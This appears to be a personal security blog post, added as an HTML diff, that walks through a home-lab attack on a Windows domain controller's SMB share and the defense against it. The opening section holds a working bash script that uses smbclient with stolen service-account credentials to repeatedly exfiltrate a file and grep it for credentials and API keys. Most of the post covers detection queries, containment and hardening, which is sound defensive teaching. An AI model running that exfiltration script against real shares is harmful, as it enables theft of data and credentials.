@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Attacking and Defending a Windows Network Share &mdash; purplepyram1d</title>
+<meta name="description" content="Fig 1. johnnymeintel.com Iâ€™ve got a vulnerable network share on domain controller DC01. SMB signing is disabled, and DC01 has overprivileged service accounts with predictable passw">
+<meta name="author" content="Johnny Meintel">
+<link rel="icon" href="../../assets/images/logo-pyramid.png">
+<link rel="stylesheet" href="../../assets/css/site.css">
+
+<link rel="canonical" href="https://johnnymeintel.com/blog/posts/attacking-and-defending-a-windows-network-share.html">
+
+<meta property="og:title" content="Attacking and Defending a Windows Network Share">
+<meta property="og:description" content="Fig 1. johnnymeintel.com Iâ€™ve got a vulnerable network share on domain controller DC01. SMB signing is disabled, and DC01 has overprivileged service accounts with predictable passw">
+<meta property="og:type" content="article">
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+<div class="wrap">
+
+  <header class="masthead compact">
+    <div class="mast-row">
+      <div>
+        <a href="../../index.html"><h1 class="title sm">purplepyram<span class="dim">1</span>d</h1></a>
+      </div>
+      <nav class="mast-nav" aria-label="Primary">
+        <a href="../../index.html">Contents</a>
+        <a href="../index.html">Writing</a>
+        <a href="../../rooted.html">Log</a>
+        <a href="https://github.com/purplepyram1d">GitHub</a>
+      </nav>
+    </div>
+  </header>
+
+  <main id="main" style="margin-top:2.5rem;">
+  <div class="grid">
+
+    <div class="rail">
+      <span>2026-01-10</span>
+      <span class="em">T1021.002</span>
+      <span>~5 min</span>
+    </div>
+
+    <article>
+      <h1>Attacking and Defending a Windows Network Share</h1>
+      <div class="art-meta">Johnny Meintel &middot; 2026-01-10</div>
+
+<figure>
+        <img src="../../assets/images/attacking-and-defending-a-windows-network-share/01.png" alt="johnnymeintel.com">
+        <figcaption><span class="lab">Fig 1.</span> johnnymeintel.com</figcaption>
+      </figure>
+      <p>Iâ€™ve got a vulnerable network share on domain controller DC01. SMB signing is disabled, and DC01 has overprivileged service accounts with predictable passwords. Letâ€™s see what happens if an attacker findsÂ out.</p>      <h2><span class="n">1</span>The Exfiltration</h2><pre>#!/bin/bash
+# ============================================
+# CONFIGURATION
+# ============================================
+TARGET_IP="192.168.56.6"
+SHARE_NAME="Public"
+USERNAME="svc-generic"
+PASSWORD="GENService2024!"
+REMOTE_FILE="sensitive_data.txt"
+LOOT_DIR="/opt/exfil/loot"
+LOG_FILE="/opt/exfil/exfil.log"
+HIGH_VALUE_FILE="/opt/exfil/high-value.txt"
+# ============================================
+
+TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
+LOCAL_FILE="$LOOT_DIR/stolen-$TIMESTAMP.txt"
+
+mkdir -p "$LOOT_DIR"
+
+smbclient "//$TARGET_IP/$SHARE_NAME" -U "$USERNAME%$PASSWORD" -c "get $REMOTE_FILE $LOCAL_FILE" 2&gt;/dev/null
+
+if [ -f "$LOCAL_FILE" ]; then
+    echo "[$TIMESTAMP] SUCCESS: Exfiltrated to $LOCAL_FILE" &gt;&gt; "$LOG_FILE"
+    grep -E "CREDENTIALS|API_KEY|FINANCIAL" "$LOCAL_FILE" &gt;&gt; "$HIGH_VALUE_FILE" 2&gt;/dev/null
+else
+    echo "[$TIMESTAMP] FAILED: Could not exfiltrate" &gt;&gt; "$LOG_FILE"
+fi
+
+find "$LOOT_DIR" -name "stolen-*.txt" -mtime +7 -delete</pre>
+      <p>The attacker found a text file stored on the Public shared network folder called â€œsensitive_data.txtâ€. DC01 runs a script that appends more data every 5 minutes. The script above will use <a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html"><strong>smbclient</strong></a><strong> </strong>along with stolen credentials and the known IP address of the domain controller to exfiltrate the file every 5 minutes asÂ well.</p>      <figure>
+        <img src="../../assets/images/attacking-and-defending-a-windows-network-share/02.png" alt="Stolen data.">
+        <figcaption><span class="lab">Fig 2.</span> Stolen data.</figcaption>
+      </figure>      <h2><span class="n">2</span>The Logs</h2>
+      <p>How would an administrator or security analyst discover this? We need to hunt for <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5145"><strong>Event 5145</strong></a>â€Šâ€”â€ŠA network share object was checked to see whether client can be granted desiredÂ access.</p>
+      <p>I cooked up a Splunk query that shows Kali specifically reaching for the sensitive_data.txt file along with the timestamps and IPÂ address:</p><pre>index=* source="XmlWinEventLog:Security" EventCode=5145 
+IpAddress="192.168.56.36"
+RelativeTargetName="sensitive_data.txt"
+| table _time, SubjectUserName, IpAddress, RelativeTargetName, ShareName
+| sort _time</pre>      <figure>
+        <img src="../../assets/images/attacking-and-defending-a-windows-network-share/03.png" alt="">
+      </figure>
+      <p>A generic service account accessing sensitive_data.txt every 5 minutes on the dot is a huge red flag. How would this be contained and remediated?</p>      <h2><span class="n">3</span>The Response</h2>
+      <p>Before we make any changes, letâ€™s document the current configuration.</p><pre># Document current share permissions
+Get-SmbShare -Name "Public" | Format-List
+Get-SmbShareAccess -Name "Public" | Format-Table
+
+# Document NTFS permissions
+Get-Acl "C:\Shares\Public" | Format-List
+
+# Document who's currently accessing the share
+Get-SmbSession | Where-Object {$_.ShareName -like "*Public*"} | Format-Table
+
+# Document what's on the share
+Get-ChildItem "C:\Shares\Public" -Recurse | Select-Object FullName, Length, LastWriteTime | Format-Table</pre>      <figure>
+        <img src="../../assets/images/attacking-and-defending-a-windows-network-share/04.png" alt="Current configuration.">
+        <figcaption><span class="lab">Fig 4.</span> Current configuration.</figcaption>
+      </figure>
+      <p>No SMB session is active, despite the data being exfiltrated regularly. This is expected, as smbclient sessions are ephemeral and the connection only exists as long as the data transfer is taking place. Fortunately, we have the attackerâ€™s IP address and the name of the compromised serviceÂ account.</p><pre># Disable svc-generic temporarily while investigating
+Disable-ADAccount -Identity "svc-generic"
+
+# Verify it's disabled
+Get-ADUser -Identity "svc-generic" | Select-Object Enabled, PasswordLastSet, LastLogonDate
+
+# Block KALI's IP address
+New-NetFirewallRule -DisplayName "Block Attacker IP - KALI" -Direction Inbound -RemoteAddress "192.168.56.36" -Action Block -Enabled True
+
+# Verify rule exists
+Get-NetFirewallRule -DisplayName "Block Attacker IP - KALI"</pre>      <figure>
+        <img src="../../assets/images/attacking-and-defending-a-windows-network-share/05.png" alt="KALI has beenÂ blocked.">
+        <figcaption><span class="lab">Fig 5.</span> KALI has beenÂ blocked.</figcaption>
+      </figure>
+      <p>Letâ€™s find the scheduled task on DC01 that is generating the sensitive data.</p><pre># Check if task exists
+Get-ScheduledTask -TaskName "SystemDataSync"
+
+# View what it does
+(Get-ScheduledTask -TaskName "SystemDataSync").Actions
+
+# Remove it
+Unregister-ScheduledTask -TaskName "SystemDataSync" -Confirm:$false
+
+# Delete the malicious script
+Remove-Item "C:\Scripts\DC01-Generate-Sensitive-Data.ps1" -Force -ErrorAction SilentlyContinue
+
+# Verify removal
+Get-ScheduledTask | Where-Object {$_.TaskName -like "*Sync*" -or $_.TaskName -like "*Data*"}</pre>      <figure>
+        <img src="../../assets/images/attacking-and-defending-a-windows-network-share/06.png" alt="The task and script have beenÂ removed.">
+        <figcaption><span class="lab">Fig 6.</span> The task and script have beenÂ removed.</figcaption>
+      </figure>
+      <p>Letâ€™s cleanup and remove the files that stillÂ exist.</p><pre># Delete the sensitive data file
+Remove-Item "C:\Shares\Public\sensitive_data.txt" -Force
+
+# Remove any suspicious scripts
+Remove-Item "C:\Shares\Public\*.ps1" -Force
+Remove-Item "C:\Shares\Public\harvested_creds.txt" -Force
+Remove-Item "C:\Shares\Public\malicious_script.ps1" -Force
+
+# Verify cleanup
+Get-ChildItem "C:\Shares\Public"</pre>      <figure>
+        <img src="../../assets/images/attacking-and-defending-a-windows-network-share/07.png" alt="Files have beenÂ removed.">
+        <figcaption><span class="lab">Fig 7.</span> Files have beenÂ removed.</figcaption>
+      </figure>      <h2><span class="n">4</span>Defense inÂ Depth</h2>
+      <p>So, we cleaned up. But how do we prevent it from happening again?</p>
+      <p><strong>Limit SMB ShareÂ Access</strong></p><pre># Current state: Domain Users have Full Control
+# Target state: Domain Users have Read-Only, specific groups have Write
+
+# Remove excessive permissions
+Revoke-SmbShareAccess -Name "Public" -AccountName "CJCS\Domain Users" -Force
+
+# Grant Read-Only to Domain Users
+Grant-SmbShareAccess -Name "Public" -AccountName "CJCS\Domain Users" -AccessRight Read -Force
+
+# Create specific group for write access (if needed)
+New-ADGroup -Name "Public Share Contributors" -GroupScope Global -GroupCategory Security -Description "Users who can write to Public share"
+
+# Grant write access only to this group
+Grant-SmbShareAccess -Name "Public" -AccountName "CJCS\Public Share Contributors" -AccessRight Change -Force
+
+# Verify new permissions
+Get-SmbShareAccess -Name "Public"</pre>      <figure>
+        <img src="../../assets/images/attacking-and-defending-a-windows-network-share/08.png" alt="Revoke current access, create the specificÂ group.">
+        <figcaption><span class="lab">Fig 8.</span> Revoke current access, create the specificÂ group.</figcaption>
+      </figure>      <figure>
+        <img src="../../assets/images/attacking-and-defending-a-windows-network-share/09.png" alt="Grant access andÂ verify.">
+        <figcaption><span class="lab">Fig 9.</span> Grant access andÂ verify.</figcaption>
+      </figure>
+      <p><strong>Fix NTFS Permissions</strong></p><pre># Get current ACL
+$acl = Get-Acl "C:\Shares\Public"
+
+# Remove "Everyone" if it exists
+$everyone = $acl.Access | Where-Object {$_.IdentityReference -eq "Everyone"}
+if ($everyone) {
+    $acl.RemoveAccessRule($everyone)
+}
+
+# Set Read-Only for Domain Users at NTFS level
+$readRule = New-Object System.Security.AccessControl.FileSystemAccessRule("CJCS\Domain Users", "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")
+$acl.SetAccessRule($readRule)
+
+# Domain Admins get Full Control
+$adminRule = New-Object System.Security.AccessControl.FileSystemAccessRule("CJCS\Domain Admins", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
+$acl.SetAccessRule($adminRule)
+
+# SYSTEM gets Full Control
+$systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule("NT AUTHORITY\SYSTEM", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
+$acl.SetAccessRule($systemRule)
+
+# Apply the new ACL
+Set-Acl "C:\Shares\Public" -AclObject $acl
+
+# Verify
+Get-Acl "C:\Shares\Public" | Select-Object -ExpandProperty Access | Format-Table IdentityReference, FileSystemRights, AccessControlType</pre>      <figure>
+        <img src="../../assets/images/attacking-and-defending-a-windows-network-share/10.png" alt="ACL permissions corrected.">
+        <figcaption><span class="lab">Fig 10.</span> ACL permissions corrected.</figcaption>
+      </figure>
+      <p><strong>Reset Compromised Password</strong></p><pre>Set-ADAccountPassword -Identity "svc-generic" -Reset -NewPassword (ConvertTo-SecureString "NewSecureP@ss2026!" -AsPlainText -Force)
+
+Enable-ADAccount -Identity "svc-generic"
+
+# Verify
+Get-ADUser "svc-generic" | Select-Object Enabled, PasswordLastSet</pre>      <figure>
+        <img src="../../assets/images/attacking-and-defending-a-windows-network-share/11.png" alt="Password changed, account reactivated.">
+        <figcaption><span class="lab">Fig 11.</span> Password changed, account reactivated.</figcaption>
+      </figure>      <h2><span class="n">5</span>Prevention</h2><pre># Require SMB signing on server side
+Set-SmbServerConfiguration -RequireSecuritySignature $true -EnableSecuritySignature $true -Force
+
+# Verify
+Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EnableSecuritySignature
+
+# Enable detailed file share auditing
+auditpol /set /subcategory:"File Share" /success:enable /failure:enable
+auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
+
+# Enable file system auditing
+auditpol /set /subcategory:"File System" /success:enable /failure:enable
+
+# Verify
+auditpol /get /subcategory:"File Share"
+auditpol /get /subcategory:"Detailed File Share"
+
+# Add audit rule to track all access to Public share
+$auditRule = New-Object System.Security.AccessControl.FileSystemAuditRule(
+    "Everyone",
+    "ReadData,WriteData,Delete",
+    "ContainerInherit,ObjectInherit",
+    "None",
+    "Success,Failure"
+)
+
+$acl = Get-Acl "C:\Shares\Public"
+$acl.AddAuditRule($auditRule)
+Set-Acl "C:\Shares\Public" -AclObject $acl
+
+# Verify audit rules
+Get-Acl "C:\Shares\Public" -Audit | Select-Object -ExpandProperty Audit
+
+# Users can only see folders they have permission to access
+Set-SmbShare -Name "Public" -FolderEnumerationMode AccessBased -Force
+
+# Verify
+Get-SmbShare -Name "Public" | Select-Object FolderEnumerationMode</pre>
+      <p><strong>What Does This ScriptÂ Do?</strong></p>
+      <p>The server will refuse connections from clients that donâ€™t sign their SMB packets. When enabled, tools like Responder or ntlmrelayx can&#39;t intercept and relay SMB authentication because the cryptographic signatures won&#39;tÂ match.</p>
+      <p>Event audit logging tells Windows to create Event ID 5140 logs whenever someone accesses a file share. Instead of just logging â€œsomeone connected to the share,â€ it logs <strong>every single file theyÂ touch</strong>.</p>
+      <p>Creates an audit rule object that will be applied to the Public share folder. This configuration says â€œlog every time anyone reads, writes, or deletes files in this folder or its subfolders, whether they succeed orÂ fail.â€</p>
+      <p><strong>The Splunk Query for Suspicious ShareÂ Access</strong></p><pre>index=* source="XmlWinEventLog:Security" EventCode=5145 
+ShareName="\\*\Public"
+| where IpAddress!="192.168.56.6" AND IpAddress!="192.168.56.7" AND IpAddress!="192.168.56.8" AND NOT match(IpAddress, "^fe80")
+| stats count by _time, IpAddress, SubjectUserName, RelativeTargetName
+| where count &gt; 5
+| eval Alert="Suspicious file share access pattern detected"</pre>
+      <p><strong>Alert Settings:</strong></p>
+      <ul><li>Trigger: When count &gt; 5 in 10-minute window</li><li>Action: Email SOCÂ team</li><li>Severity: Medium</li></ul>
+      <p>Has it been fixed? Letâ€™s try to access the share from KALI and see whatÂ happens.</p>      <figure>
+        <img src="../../assets/images/attacking-and-defending-a-windows-network-share/12.png" alt="NT_STATUS_LOGON_FAILURE">
+        <figcaption><span class="lab">Fig 12.</span> NT_STATUS_LOGON_FAILURE</figcaption>
+      </figure>
+      <p>We successfully kicked out KALI from the DC01 Public network share. Something tells me this is not the last we will hear from the attacker. StayÂ tuned!</p>
+      <p><strong>Follow me:</strong></p>
+      <p><a href="https://johnnymeintel.com/">My Website</a></p>
+      <p><a href="https://www.linkedin.com/in/johnny-meintel-3a9280269/">LinkedIn</a></p>
+      <p><a href="https://x.com/548074G3">X</a></p>
+      <p><a href="https://github.com/johnnymeintel/johnnycybersec">GitHub</a></p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=ff61b8d4cb7b" width="1" height="1" alt="">
+
+      <hr>
+
+      <p class="kicker" style="font-family:var(--mono);font-size:.75rem;color:var(--ink-3);">
+        Rules and reproduction steps:
+        <a href="https://github.com/purplepyram1d/rmm-multiplicity" style="border-bottom:1px solid var(--rule);">github.com/purplepyram1d/rmm-multiplicity</a>
+      </p>
+    </article>
+  </div>
+  </main>
+
+  <footer>
+    <div class="grid">
+      <div class="rail"><span>about</span></div>
+      <div class="colophon">
+        <p class="fine">
+          <a href="https://github.com/purplepyram1d">github</a> &middot;
+          <a href="https://www.linkedin.com/in/johnnymeintel">linkedin</a><br>
+          <a href="../../index.html">&larr; contents</a>
+        </p>
+      </div>
+    </div>
+  </footer>
+
+</div>
+</body>
+</html>
